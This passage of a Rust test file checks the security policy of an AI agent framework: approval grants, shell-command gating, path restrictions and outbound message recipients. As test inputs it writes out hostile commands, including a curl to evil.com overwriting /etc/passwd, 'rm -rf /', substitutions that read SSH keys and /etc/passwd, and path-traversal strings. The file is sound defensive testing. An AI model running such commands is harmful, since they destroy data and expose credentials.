        ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring, sign_grant,
    };
    let _guard = global_keyring_guard();
    let keyring = WitnessKeyring::global().expect("test: keyring");
    let op = "file_write:write:denyme";
    let subject = Subject {
        agent_id: "prx:agent".to_string(),
        principal_id: "telegram:alice".to_string(),
        owner_id: "owner:alice".to_string(),
        workspace_id: "ws".to_string(),
        session_key: Some("s1".to_string()),
    };

    // (2) operation_hash=None (no precise binding, v1 wildcard grant)
    {
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        let wildcard = ApprovalGrant::for_tool("file_write", "test", None);
        let _ = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&wildcard))
            .unwrap_err();
        assert!(last_deny_reason(tmp.path()).contains("operation_hash=None"));
    }
    // (3) cross-tenant principal mismatch
    {
        let g = ApprovalGrantV2::issue_one_shot(
            keyring,
            subject.clone(),
            IssuerAuthority::HumanReview,
            op,
            RiskLevel::Medium,
        )
        .expect("test: issue");
        let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
            .with_caller_principal_id(Some("telegram:mallory".to_string()));
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        let _ = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
            .unwrap_err();
        assert!(last_deny_reason(tmp.path()).contains("principal mismatch"));
    }
    // (4) expired
    {
        let mut g = ApprovalGrantV2::issue_one_shot(
            keyring,
            subject.clone(),
            IssuerAuthority::HumanReview,
            op,
            RiskLevel::Medium,
        )
        .expect("test: issue");
        g.not_before = Utc::now() - chrono::Duration::seconds(120);
        g.expires_at = Utc::now() - chrono::Duration::seconds(60);
        sign_grant(keyring, &mut g).expect("test: sign");
        let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
            .with_caller_principal_id(Some("telegram:alice".to_string()));
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        let _ = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
            .unwrap_err();
        assert!(last_deny_reason(tmp.path()).contains("validity window"));
    }
    // (5) revoked
    {
        let mut g = ApprovalGrantV2::issue_one_shot(
            keyring,
            subject.clone(),
            IssuerAuthority::HumanReview,
            op,
            RiskLevel::Medium,
        )
        .expect("test: issue");
        g.revoke("operator", Utc::now());
        sign_grant(keyring, &mut g).expect("test: sign");
        let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
            .with_caller_principal_id(Some("telegram:alice".to_string()));
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        let _ = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
            .unwrap_err();
        assert!(last_deny_reason(tmp.path()).contains("revoked"));
    }
    // (6) single-use exhausted
    {
        let mut g =
            ApprovalGrantV2::issue_one_shot(keyring, subject, IssuerAuthority::HumanReview, op, RiskLevel::Medium)
                .expect("test: issue");
        g.uses_consumed = g.max_uses;
        sign_grant(keyring, &mut g).expect("test: sign");
        let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
            .with_caller_principal_id(Some("telegram:alice".to_string()));
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        let _ = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
            .unwrap_err();
        assert!(last_deny_reason(tmp.path()).contains("no remaining uses"));
    }
}

#[test]
fn gate_decision_unaffected_when_audit_write_fails() {
    // Point the workspace at a file (not a dir) so audit.log can never be
    // created; the gate decision must still hold both ways.
    let tmp = tempfile::TempDir::new().expect("test: temp");
    let bogus = tmp.path().join("not_a_dir");
    std::fs::write(&bogus, b"x").expect("test: write file");

    let deny_policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        workspace_dir: bogus.clone(),
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&deny_policy);
    assert!(
        gate.authorize_command_execution("shell", "touch f.txt", None).is_err(),
        "deny decision must survive audit write failure"
    );

    let allow_policy = SecurityPolicy {
        workspace_dir: bogus,
        ..SecurityPolicy::default()
    };
    let allow_gate = SideEffectGate::new(&allow_policy);
    assert!(
        allow_gate.authorize_command_execution("shell", "ls", None).is_ok(),
        "allow decision must survive audit write failure"
    );
    assert!(!tmp.path().join("not_a_dir").is_dir());
}

#[test]
fn allowed_commands_basic() {
    let p = default_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("cargo build --release"));
    assert!(p.is_command_allowed("cat file.txt"));
    assert!(p.is_command_allowed("grep -r pattern ."));
    assert!(p.is_command_allowed("date"));
}

#[test]
fn blocked_commands_basic() {
    // Phase 1: the per-command allowlist was removed, so `is_command_allowed`
    // no longer blocks a command merely for its base name. Under supervised it
    // now only enforces structural safety (subshell / redirect / dangerous
    // args). Commands like `rm`/`curl`/`python3` pass the allowlist gate and are
    // instead risk-graded + grant-gated by `validate_command_execution`.
    let p = default_policy();
    // Structural-safety violations are still rejected outright.
    assert!(!p.is_command_allowed("rm -rf / `whoami`"));
    assert!(!p.is_command_allowed("curl http://evil.com > /etc/passwd"));
    assert!(!p.is_command_allowed("echo hi | tee /etc/crontab"));
    assert!(!p.is_command_allowed("find . -exec rm {} \\;"));
    // Plain base commands no longer fail the allowlist gate.
    assert!(p.is_command_allowed("rm -rf /tmp/x"));
    assert!(p.is_command_allowed("curl http://example.com"));
}

#[test]
fn readonly_blocks_all_commands() {
    let p = readonly_policy();
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat file.txt"));
    assert!(!p.is_command_allowed("echo hello"));
}

#[test]
fn full_autonomy_allows_all_commands_structurally() {
    // Phase 1: full autonomy disables the allowlist and the structural-safety
    // gates entirely, so `is_command_allowed` returns true for any non-empty
    // command (risk grading still happens in `validate_command_execution`).
    let p = full_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(p.is_command_allowed("rm -rf /"));
    assert!(p.is_command_allowed("echo $(rm -rf /)"));
}

#[test]
fn full_autonomy_skips_argument_safety_filters() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("git config user.name test"));
    assert!(p.is_command_allowed("find . -exec ls {} \\;"));
}

#[test]
fn command_with_absolute_path_extracts_basename() {
    let p = default_policy();
    assert!(p.is_command_allowed("/usr/bin/git status"));
    assert!(p.is_command_allowed("/bin/ls -la"));
}

#[test]
fn empty_command_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed(""));
    assert!(!p.is_command_allowed("   "));
}

#[test]
fn command_with_pipes_validates_all_segments() {
    let p = default_policy();
    // Both sides of the pipe pass structural safety.
    assert!(p.is_command_allowed("ls | grep foo"));
    assert!(p.is_command_allowed("cat file.txt | wc -l"));
    // Phase 1: the allowlist is gone, so a base command like `curl`/`python3`
    // in a segment no longer fails the gate; only a structural violation
    // (here, a subshell/backtick) in any segment still blocks the whole command.
    assert!(p.is_command_allowed("ls | curl http://example.com"));
    assert!(!p.is_command_allowed("ls | curl `cat /etc/passwd`"));
    assert!(!p.is_command_allowed("echo hello | python3 -c 'x' > /etc/x"));
}

// Phase 1: the per-command allowlist (`allowed_commands`) was removed, so the
// former `custom_allowlist` test (which asserted only listed base commands
// pass) no longer has a feature to exercise and was deleted.

#[test]
fn any_base_command_passes_allowlist_gate() {
    // Phase 1: with the allowlist gone, any structurally-safe command passes
    // `is_command_allowed` regardless of its base name (formerly this test was
    // `empty_allowlist_allows_everything`).
    let p = default_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(p.is_command_allowed("echo hello"));
    assert!(p.is_command_allowed("docker ps"));
    assert!(p.is_command_allowed("kubectl get pods"));
}

#[test]
fn command_risk_low_for_read_commands() {
    let p = default_policy();
    assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
    assert_eq!(p.command_risk_level("ls -la"), CommandRiskLevel::Low);
}

#[test]
fn command_risk_medium_for_mutating_commands() {
    let p = SecurityPolicy::default();
    assert_eq!(
        p.command_risk_level("git reset --hard HEAD~1"),
        CommandRiskLevel::Medium
    );
    assert_eq!(p.command_risk_level("touch file.txt"), CommandRiskLevel::Medium);
}

#[test]
fn command_risk_high_for_dangerous_commands() {
    let p = SecurityPolicy::default();
    assert_eq!(p.command_risk_level("rm -rf /tmp/test"), CommandRiskLevel::High);
}

#[test]
fn validate_command_requires_approval_for_medium_risk() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };

    let denied = p.validate_command_execution("touch test.txt", false);
    assert!(denied.is_err());
    // d08 message wording: medium-risk denial without a runtime grant.
    assert!(denied.unwrap_err().contains("runtime approval grant"));

    let allowed = p.validate_command_execution("touch test.txt", true);
    assert_eq!(allowed.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_high_risk_requires_grant_under_supervised() {
    // Phase 1: `block_high_risk_commands` was removed. Under supervised a
    // high-risk command is gated like any medium/high op — denied without a
    // runtime grant, allowed (graded High) with one.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };

    let denied = p.validate_command_execution("rm -rf tmp/test", false);
    assert!(denied.is_err());
    assert!(denied.unwrap_err().contains("runtime approval grant"));

    let allowed = p.validate_command_execution("rm -rf tmp/test", true);
    assert_eq!(allowed.unwrap(), CommandRiskLevel::High);
}

#[test]
fn validate_command_rejects_forbidden_path_for_supervised_and_full() {
    for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
        let policy = SecurityPolicy {
            autonomy,
            ..SecurityPolicy::default()
        };
        for command in ["cat /etc/passwd", "cat </etc/passwd", "cat</etc/passwd"] {
            let error = policy
                .validate_command_execution(command, true)
                .expect_err("forbidden path must be rejected");
            assert_eq!(error, "forbidden path argument: /etc/passwd");
        }
        assert!(
            policy
                .validate_command_execution("echo 'literal </etc/passwd in documentation'", true)
                .is_ok(),
            "quoted redirection-like prose must remain literal"
        );
    }
}

#[test]
fn validate_command_rejects_dynamic_shell_paths_but_preserves_single_quote_literals() {
    for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
        let policy = SecurityPolicy {
            autonomy,
            ..SecurityPolicy::default()
        };
        for (command, expected_error) in [
            (
                r#"cat "$HOME/.ssh/id_rsa""#,
                "forbidden dynamic path argument: $HOME/.ssh/id_rsa",
            ),
            ("X=/etc/passwd; cat <$X", "forbidden dynamic path argument: $X"),
            ("cat $FILE", "forbidden dynamic path argument: $FILE"),
            (
                "FILE=/etc/passwd; command cat $FILE",
                "forbidden dynamic path argument: $FILE",
            ),
            (
                "FILE=/etc/passwd; eval 'cat $FILE'",
                "forbidden dynamic path argument: $FILE",
            ),
            (
                r#"FILE=/etc/passwd sh -c 'cat "$FILE"'"#,
                "forbidden dynamic path argument: $FILE",
            ),
            (
                r#"python -c 'open("/etc/passwd").read()'"#,
                "forbidden path argument: /etc/passwd",
            ),
        ] {
            let error = policy
                .validate_command_execution(command, true)
                .expect_err("dynamic shell path must fail closed");
            assert_eq!(error, expected_error);
        }
        assert!(
            policy.validate_command_execution("echo '$HOME/.ssh'", true).is_ok(),
            "single-quoted dollar expressions are literal"
        );
        for command in ["echo $HOME", "printf $KEY", "sleep $SECONDS"] {
            assert!(
                policy.validate_command_execution(command, true).is_ok(),
                "benign no-slash dynamic argument should remain compatible: {command}"
            );
        }
        for command in ["sh ./script.sh", "python script.py", "python ./script.py"] {
            assert!(
                policy.validate_command_execution(command, true).is_ok(),
                "literal relative interpreter script should remain compatible: {command}"
            );
        }
    }
}

#[test]
fn validate_command_rejects_active_substitutions_but_allows_single_quoted_prose() {
    for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
        let policy = SecurityPolicy {
            autonomy,
            ..SecurityPolicy::default()
        };
        for command in [
            r#"cat `printf '\057etc\057passwd'`"#,
            r#"echo "$(cat /etc/passwd)""#,
            "cat <(printf secret)",
            "cat >(cat)",
        ] {
            assert_eq!(
                policy
                    .validate_command_execution(command, true)
                    .expect_err("active substitution must fail closed"),
                "forbidden active shell substitution"
            );
        }
        for command in [
            "echo '$(cat /etc/passwd)'",
            "echo 'literal `cat /etc/passwd` prose'",
            "echo 'literal <(cat /etc/passwd) prose'",
        ] {
            assert!(
                policy.validate_command_execution(command, true).is_ok(),
                "single-quoted substitution-like prose must remain literal: {command}"
            );
        }
    }
}

#[test]
fn validate_command_folds_line_continuations_before_substitution_policy_parsing() {
    let continued = [
        "echo $\\\n(printf secret)",
        "cat <\\\n(printf secret)",
        "echo $\\\r\n(printf secret)",
        "cat <\\\r\n(printf secret)",
    ];
    let direct = ["echo $(printf secret)", "cat <(printf secret)"];
    let single_quoted = [
        "echo 'literal $\\\n(printf secret) prose'",
        "echo 'literal <\\\r\n(printf secret) prose'",
    ];

    for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
        let policy = SecurityPolicy {
            autonomy,
            ..SecurityPolicy::default()
        };
        for command in continued.into_iter().chain(direct) {
            assert_eq!(
                policy
                    .validate_command_execution(command, true)
                    .expect_err("continued and direct substitutions must fail closed"),
                "forbidden active shell substitution"
            );
        }
        for command in single_quoted {
            assert!(
                policy.validate_command_execution(command, true).is_ok(),
                "single-quoted backslash-newline prose must remain literal: {command:?}"
            );
        }
    }
}

#[test]
fn fold_shell_line_continuations_honors_quotes_crlf_and_backslash_parity() {
    assert_eq!(fold_shell_line_continuations("echo $\\\n(value)"), "echo $(value)");
    assert_eq!(fold_shell_line_continuations("echo $\\\r\n(value)"), "echo $(value)");
    assert_eq!(
        fold_shell_line_continuations("echo \"$\\\n(value)\""),
        "echo \"$(value)\""
    );

    let single_quoted = "echo 'literal \\\nprose'";
    assert_eq!(fold_shell_line_continuations(single_quoted), single_quoted);

    let even_backslashes = ["echo ", r"\\", "\nnext"].concat();
    assert_eq!(fold_shell_line_continuations(&even_backslashes), even_backslashes);
    let odd_backslashes = ["echo ", r"\\\", "\nnext"].concat();
    assert_eq!(
        fold_shell_line_continuations(&odd_backslashes),
        ["echo ", r"\\", "next"].concat()
    );
}

#[test]
fn structural_path_and_risk_parsers_use_the_folded_command() {
    let supervised = default_policy();
    assert!(!supervised.is_command_allowed("find . -e\\\nxec printf {} \\;"));
    assert!(!supervised.is_command_allowed("find . -exec printf {} \\;"));

    for autonomy in [AutonomyLevel::Supervised, AutonomyLevel::Full] {
        let policy = SecurityPolicy {
            autonomy,
            ..SecurityPolicy::default()
        };
        for command in ["cat /etc/pass\\\nwd", "cat /etc/passwd"] {
            assert_eq!(
                policy
                    .validate_command_execution(command, true)
                    .expect_err("continued and direct forbidden paths must both fail closed"),
                "forbidden path argument: /etc/passwd"
            );
        }
        assert_eq!(policy.command_risk_level("r\\\nm -rf tmp"), CommandRiskLevel::High);
        assert_eq!(policy.command_risk_level("rm -rf tmp"), CommandRiskLevel::High);
    }
}

#[test]
fn validate_command_full_mode_skips_medium_risk_approval_gate() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("touch test.txt", false);
    assert_eq!(result.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_rejects_background_chain_bypass() {
    let p = default_policy();
    let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("not allowed"));
}

// ── is_path_allowed ─────────────────────────────────────

#[test]
fn relative_paths_allowed() {
    let p = default_policy();
    assert!(p.is_path_allowed("file.txt"));
    assert!(p.is_path_allowed("src/main.rs"));
    assert!(p.is_path_allowed("deep/nested/dir/file.txt"));
}

#[test]
fn path_traversal_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("../etc/passwd"));
    assert!(!p.is_path_allowed("../../root/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("foo/../../../etc/shadow"));
    assert!(!p.is_path_allowed(".."));
}

#[test]
fn absolute_paths_outside_workspace_blocked_when_workspace_only() {
    let p = default_policy();
    assert!(!p.is_path_allowed("/etc/passwd"));
    assert!(!p.is_path_allowed("/root/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("/tmp/file.txt"));
}

#[test]
fn absolute_paths_allowed_when_not_workspace_only() {
    let p = SecurityPolicy {
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(p.is_path_allowed("/tmp/file.txt"));
}

#[test]
fn forbidden_paths_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/etc/passwd"));
    assert!(!p.is_path_allowed("/root/.bashrc"));
    assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("~/.gnupg/pubring.kbx"));
}

#[test]
fn empty_path_allowed() {
    let p = default_policy();
    assert!(p.is_path_allowed(""));
}

#[test]
fn dotfile_in_workspace_allowed() {
    let p = default_policy();
    assert!(p.is_path_allowed(".gitignore"));
    assert!(p.is_path_allowed(".env"));
}

// ── from_config ─────────────────────────────────────────

// ── Outbound recipient authorization (plan a1) ──────────────────────

fn outbound_rule(channel: Option<&str>, send_allow: &[&str], send_deny: &[&str]) -> crate::config::ScopeRule {
    crate::config::ScopeRule {
        user: None,
        channel: channel.map(str::to_string),
        chat_type: None,
        tools_allow: vec![],
        tools_deny: vec![],
        send_allow: send_allow.iter().map(|s| (*s).to_string()).collect(),
        send_deny: send_deny.iter().map(|s| (*s).to_string()).collect(),
        assign_allow: vec![],
        assign_deny: vec![],
    }
}

#[test]
fn outbound_same_channel_allowed_without_any_rule() {
    let p = make_scope_policy(vec![], true);
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "+15550001111"
    ));
}

#[test]
fn outbound_same_channel_allowed_even_when_scope_default_is_deny() {
    // `autonomy.scopes.default` governs tool access, not recipients.
    let p = make_scope_policy(vec![], false);
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "+15550001111"
    ));
}

#[test]
fn outbound_cross_channel_denied_without_send_allow() {
    let p = make_scope_policy(vec![], true);
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "telegram",
        "12345"
    ));
}

#[test]
fn outbound_cross_channel_allowed_by_send_allow() {
    let p = make_scope_policy(vec![outbound_rule(Some("wacli"), &["telegram:*"], &[])], true);
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "telegram",
        "12345"
    ));
    // A destination outside the whitelist stays denied, same channel included.
    assert!(!p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "discord", "99"));
    assert!(!p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "wacli", "+1"));
}

#[test]
fn outbound_send_deny_blocks_same_channel() {
    let p = make_scope_policy(vec![outbound_rule(None, &[], &["*:+15550001111"])], true);
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "+15550001111"
    ));
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "+15550002222"
    ));
}

#[test]
fn outbound_send_deny_outranks_send_allow() {
    let p = make_scope_policy(vec![outbound_rule(None, &["*"], &["telegram:12345"])], true);
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "telegram",
        "12345"
    ));
    // Same rule still allows every other destination via the wildcard allow.
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "telegram",
        "67890"
    ));
}

/// R2: a rule carrying no outbound entry is not an outbound rule and must
/// not consume the decision. Before the fix the first matching rule won
/// outright, so an unrelated rule matching the same scope disabled every
/// later `send_deny` silently — the operator saw no error and no denial.
#[test]
fn outbound_rule_without_send_entries_does_not_shadow_a_later_send_deny() {
    let mut tools_only = outbound_rule(Some("wacli"), &[], &[]);
    tools_only.tools_deny = vec!["shell".to_string()];
    let p = make_scope_policy(vec![tools_only, outbound_rule(None, &[], &["*"])], true);
    // The `tools_deny`-only rule matches first but says nothing about
    // recipients, so the deny-everything rule below it still applies.
    assert!(!p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "wacli", "+1"));
    // Its tool semantics are untouched: first-match-wins still governs those.
    assert!(!p.is_tool_allowed("shell", "alice", "wacli", "direct"));
}

/// R2: `send_deny` sweeps every matching rule, so an earlier rule that does
/// carry outbound entries cannot shadow a later denial either.
#[test]
fn outbound_send_deny_is_reachable_behind_an_earlier_outbound_rule() {
    let p = make_scope_policy(
        vec![
            outbound_rule(Some("wacli"), &["wacli:*"], &[]),
            outbound_rule(None, &[], &["wacli:+15550001111"]),
        ],
        true,
    );
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "+15550001111"
    ));
    // Everything else still rides the first rule's whitelist.
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "+15550002222"
    ));
}

/// R2 zero-regression: rule ordering still decides which whitelist applies,
/// and a rule whose criteria do not match is still skipped entirely.
#[test]
fn outbound_first_matching_whitelist_still_decides() {
    let p = make_scope_policy(
        vec![
            outbound_rule(Some("wacli"), &["telegram:*"], &[]),
            outbound_rule(None, &["*"], &[]),
        ],
        true,
    );
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "telegram",
        "12345"
    ));
    assert!(!p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "discord", "99"));
    // A telegram turn skips the first rule and lands on the wildcard one.
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "telegram",
        "direct",
        "discord",
        "99"
    ));
}

/// R2 zero-regression: with no `send_*` entry configured anywhere, every
/// rule is skipped and the same-channel default is exactly today's answer.
#[test]
fn outbound_rules_without_send_entries_leave_the_default_untouched() {
    let mut tools_only = outbound_rule(None, &[], &[]);
    tools_only.tools_deny = vec!["*".to_string()];
    let p = make_scope_policy(vec![tools_only], true);
    assert!(p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "wacli", "+1"));
    assert!(!p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "telegram", "+1"));
}

#[test]
fn outbound_entry_channel_scoping_is_exact() {
    let p = make_scope_policy(vec![outbound_rule(None, &[], &["signal:+1"])], true);
    assert!(!p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "signal", "direct", "signal", "+1"));
    // Same recipient on a different channel is untouched by the entry.
    assert!(p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "wacli", "+1"));
}

#[test]
fn outbound_entry_recipient_may_contain_colons() {
    // The entry is still split at its *first* colon, so the recipient half
    // keeps every colon it was written with.
    let p = make_scope_policy(vec![outbound_rule(None, &[], &["telegram:12345:678"])], true);
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "telegram",
        "group",
        "telegram",
        "12345:678"
    ));
    // A colon in a non-JID recipient is part of the identifier — a Telegram
    // forum topic is not its parent chat — so it is never folded away.
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "telegram",
        "group",
        "telegram",
        "12345"
    ));
}

// ── R1: derivable recipient aliases ─────────────────────────────────

/// A JID's device suffix is transport detail, in either position wacli
/// emits it, and the server is a case-insensitive domain.
#[test]
fn outbound_send_deny_folds_jid_device_suffix_and_server_case() {
    let p = make_scope_policy(vec![outbound_rule(None, &[], &["wacli:1234@s.whatsapp.net"])], true);
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "1234@s.whatsapp.net"
    ));
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "1234:2@s.whatsapp.net"
    ));
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "1234@s.whatsapp.net:2"
    ));
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "1234@S.WhatsApp.Net"
    ));
    // A different account is untouched.
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "9999@s.whatsapp.net"
    ));
}

/// The WhatsApp Cloud API strips a leading `+` before sending, so the two
/// spellings are one account and a deny entry must catch both.
#[test]
fn outbound_send_deny_folds_leading_plus() {
    let p = make_scope_policy(vec![outbound_rule(None, &[], &["whatsapp:+15550001111"])], true);
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "whatsapp",
        "direct",
        "whatsapp",
        "+15550001111"
    ));
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "whatsapp",
        "direct",
        "whatsapp",
        "15550001111"
    ));
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "whatsapp",
        "direct",
        "whatsapp",
        "15550002222"
    ));
}

/// Signal classifies a recipient as a UUID with `Uuid::parse_str`, which
/// accepts the hyphenless and upper-case spellings too.
#[test]
fn outbound_send_deny_folds_uuid_spelling() {
    let p = make_scope_policy(
        vec![outbound_rule(
            None,
            &[],
            &["signal:2b1d0e7a-9c3f-4a5b-8d6e-7f0a1b2c3d4e"],
        )],
        true,
    );
    for spelling in [
        "2b1d0e7a-9c3f-4a5b-8d6e-7f0a1b2c3d4e",
        "2B1D0E7A-9C3F-4A5B-8D6E-7F0A1B2C3D4E",
        "2b1d0e7a9c3f4a5b8d6e7f0a1b2c3d4e",
    ] {
        assert!(
            !p.is_outbound_allowed(
                AutonomyLevel::Supervised,
                "alice",
                "signal",
                "direct",
                "signal",
                spelling
            ),
            "{spelling} should be denied"
        );
    }
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "signal",
        "direct",
        "signal",
        "+15550001111"
    ));
}

/// Folding widens denial only. A whitelist is matched exactly, because a
/// wrong guess about two spellings must never *grant* reach.
#[test]
fn outbound_send_allow_is_never_widened_by_alias_folding() {
    let p = make_scope_policy(vec![outbound_rule(None, &["wacli:1234@s.whatsapp.net"], &[])], true);
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "1234@s.whatsapp.net"
    ));
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "1234:2@s.whatsapp.net"
    ));
}

/// The channel half of a deny entry is never folded — only the recipient is.
#[test]
fn outbound_deny_folding_does_not_cross_channels() {
    let p = make_scope_policy(vec![outbound_rule(None, &[], &["wacli:+1234"])], true);
    assert!(!p.is_outbound_allowed(AutonomyLevel::Supervised, "alice", "wacli", "direct", "wacli", "1234"));
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "telegram",
        "direct",
        "telegram",
        "1234"
    ));
}

/// A LID and the same contact's phone JID are different numbers, so no
/// string fold can connect them. The documented answer is to list both, or
/// to deny the channel outright.
#[test]
fn outbound_send_deny_cannot_fold_a_lid_onto_a_phone_jid() {
    let phone_only = make_scope_policy(vec![outbound_rule(None, &[], &["wacli:1234@s.whatsapp.net"])], true);
    assert!(phone_only.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "5678@lid"
    ));

    let both = make_scope_policy(
        vec![outbound_rule(
            None,
            &[],
            &["wacli:1234@s.whatsapp.net", "wacli:5678@lid"],
        )],
        true,
    );
    assert!(!both.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "1234@s.whatsapp.net"
    ));
    assert!(!both.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "5678@lid"
    ));

    let whole_channel = make_scope_policy(vec![outbound_rule(None, &[], &["wacli:*"])], true);
    assert!(!whole_channel.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "alice",
        "wacli",
        "direct",
        "wacli",
        "5678@lid"
    ));
}

#[test]
fn fold_recipient_leaves_an_already_canonical_identifier_alone() {
    assert_eq!(fold_recipient("1234@s.whatsapp.net"), "1234@s.whatsapp.net");
    assert_eq!(fold_recipient("12345"), "12345");
    assert_eq!(fold_recipient("12345:678"), "12345:678");
    assert_eq!(fold_recipient(" +15550001111 "), "15550001111");
}

// ── Chat-assignment authorization (plan c1) ─────────────────────────

fn assign_rule(channel: Option<&str>, assign_allow: &[&str], assign_deny: &[&str]) -> crate::config::ScopeRule {
    crate::config::ScopeRule {
        channel: channel.map(str::to_string),
        assign_allow: assign_allow.iter().map(|entry| (*entry).to_string()).collect(),
        assign_deny: assign_deny.iter().map(|entry| (*entry).to_string()).collect(),
        ..crate::config::ScopeRule::default()
    }
}

fn assign_policy(rules: Vec<crate::config::ScopeRule>, owners: &[&str]) -> SecurityPolicy {
    SecurityPolicy {
        scope_rules: rules,
        assign_owners: owners.iter().map(|entry| (*entry).to_string()).collect(),
        ..SecurityPolicy::default()
    }
}

/// The whole shape of this predicate, in one assertion: nothing configured
/// means nobody may assign. That is the opposite of the outbound default,
